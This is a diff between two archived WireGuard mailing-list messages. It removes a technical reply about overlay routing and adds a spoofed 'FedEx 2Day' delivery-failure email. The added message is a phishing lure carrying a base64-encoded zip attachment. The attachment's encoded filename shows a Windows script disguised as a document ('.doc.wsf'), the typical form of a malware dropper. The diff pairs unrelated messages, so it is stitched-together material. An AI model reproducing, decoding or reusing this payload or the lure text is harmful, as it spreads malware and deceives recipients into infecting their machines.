@@ -1,22 +1,18 @@
-Return-Path: john@mib-infotech.co.nz
-Received: from mail-pf0-f176.google.com (mail-pf0-f176.google.com
- [209.85.192.176])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 6b6b2cab
- for <wireguard@lists.zx2c4.com>; Sun, 4 Dec 2016 05:54:20 +0000 (UTC)
-Received: by mail-pf0-f176.google.com with SMTP id c4so58368268pfb.1
- for <wireguard@lists.zx2c4.com>; Sat, 03 Dec 2016 21:59:21 -0800 (PST)
-Return-Path: <john@mib-infotech.co.nz>
-From: John Huttley <john@mib-infotech.co.nz>
-Subject: Re: DMVPM appreciation
-To: John Huttley <john@mib-infotech.co.nz>
-References: <20161203115342.20950-1-list@eworm.de>
- <e1085a46-e38f-c13c-86f5-de312b3a5c05@mib-infotech.co.nz>
-Message-ID: <689268d1-473f-6df6-61ba-989f8aed9928@mib-infotech.co.nz>
-Date: Sun, 4 Dec 2016 18:57:04 +1300
+Return-Path: admin@cp.jhost.pro
+Received: from cp.jhost.pro (jhost.pro [85.143.209.79])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id f9994cb6
+ for <wireguard@lists.zx2c4.com>; Sun, 4 Dec 2016 09:46:39 +0000 (UTC)
+Received: from admin by cp.jhost.pro with local (Exim 4.84_2)
+ (envelope-from <admin@cp.jhost.pro>) id 1cDTSN-0000Cb-A5
+ for wireguard@lists.zx2c4.com; Sun, 04 Dec 2016 09:51:39 +0000
+To: wireguard@lists.zx2c4.com
+Subject: Problems with item delivery, n.0000314221
+Date: Sun, 4 Dec 2016 09:51:39 +0000
+From: "FedEx 2Day" <bradley.kane@jobbler.ru>
+Message-ID: <b9546950d5de44dce1de7a89a75b3f63@jobbler.ru>
 MIME-Version: 1.0
-In-Reply-To: <e1085a46-e38f-c13c-86f5-de312b3a5c05@mib-infotech.co.nz>
-Content-Type: text/plain; charset=utf-8
-Cc: WireGuard mailing list <wireguard@lists.zx2c4.com>
+Content-Type: multipart/mixed; boundary="b1_c7cb9d6b3dbdb4bedfc94fc156f4e22b"
+Reply-To: FedEx 2Day <bradley.kane@jobbler.ru>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -26,86 +22,53 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-Hmm...
-Really good high level theory ...
+--b1_c7cb9d6b3dbdb4bedfc94fc156f4e22b
+Content-Type: text/plain; charset=us-ascii
+
+Dear Customer,
+
+Your parcel has arrived at December 02. Courier was unable to deliver the parcel to you.
+Delivery Label is attached to this email.
+
+Warm regards,
+Bradley Kane,
+Sr. Station Agent.
 
 
-> Don't forget we need two more things:
-> * A --> C (over UDP)
-> * C --> A (over UDP)
+--b1_c7cb9d6b3dbdb4bedfc94fc156f4e22b
+Content-Type: application/zip; name="FedEx_0000314221.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=FedEx_0000314221.zip
 
->Throw a few weird NAT/PAT and other ACLs in between and try again.
-
-In one direction there is no need, because that's how we established the
-tunnel. See below, we could make exposed endpoints a requirement.
-
-
-
-
->> First. A can talk to C just fine on the VPN. Thats all the
->> authentication required.
->>
->Yes, but in the background A only talks to B over UDP... and B to C
->over UDP.
-
-Sorry I don't get what you mean. Anyone /could/ talk to anyone,
-firewalls permitting.
-
-
->I think there may be cases where such situation is possible and highly
->desirable.
->The logic being, try to talk directly (using the protocol described
->above), if it doesn't work, continue talking via B.
->Reminds me of STUN and friends.
-
-Actually we can simplify it further. Just make it a requirement of
-overlaying that you have a valid listener. Then no UDP magic. Overly
-works or it doesn't.
-
->And an alternative will be centralized database/service advertising
->public keys and endpoints (think PGP keyserver).
->And then comes the WoT and then... Jason will shoot us for bringing
->the complexity he is so fond of avoiding (and I am supporting him) :-D
-
-Agreed. I don't think Jason will be more than mildly interested and it
-shouldn't be a part of Wireguard itself.
-
->Since this functionality can be implemented outside of Wireguard, as a
->simple script (I guess 5 lines of Bash, but will leave the challenge
->open), it is all a matter of convenience.
->Nothing can be gained by "building it in", may be except tiny >convenience.
->If you try to script it, then provide clean documentation/test cases,
->I am sure it can be included in
->https://git.zx2c4.com/WireGuard/plain/contrib/examples/
-
-Agreed.
-
->Also consider the trust model you are changing, because security DOES
->matter :-)
->As an example, think buying on Amazon from 3rd party, vs. talking to
->them directly:
->(1st -> 2nd case may be possible, 2nd ->1st is highly improbable)
-
-If you are on the VPN, you are by definition, trusted as much as anyone is.
-
-"Improbable" is a policy decision. Overlaying might not even be of
-benefit. If C is on bad, slow connection, an overlay to C isn't going to
-help. Policy needs to figure that out.
+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
 
 
-
->* 1st case is more secure, but more expensive
->* 1st provides a way to find your party, plus it provides some
->mediatior/trust relationship (at cost)
->* How often did you buy something via Amazon an then went directly to
->the seller to buy more?
-
-This isn't the use case I'm considering. I'm not quite sure what you mean.
-
->It is all about balancing security/cost and convenience of setup a
->transaction, within some (implicit) trust/insurance model.
-
-Definitely don't know what you mean.
-
-Regards
--Dad
+--b1_c7cb9d6b3dbdb4bedfc94fc156f4e22b--
